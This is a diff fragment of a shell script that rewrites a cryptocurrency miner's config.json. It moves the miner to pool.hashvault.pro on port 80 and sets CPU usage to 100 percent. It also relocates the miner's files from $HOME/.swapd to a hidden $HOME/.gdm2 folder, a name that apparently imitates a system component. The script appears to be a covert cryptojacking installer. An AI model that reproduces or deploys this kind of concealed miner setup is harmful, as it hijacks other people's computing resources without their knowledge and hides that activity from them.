@@ -237,13 +237,12 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.swapd/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.swapd/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.swapd/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.swapd/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
-sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
+sed -i 's/"url": *"[^"]*",/"url": "pool.hashvault.pro:80",/' $HOME/.gdm2/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "x",/' $HOME/.gdm2/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/log'",#' $HOME/.gdm2/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2/config.json
 
 #echo "[*] Copying xmrig-proxy config"
 
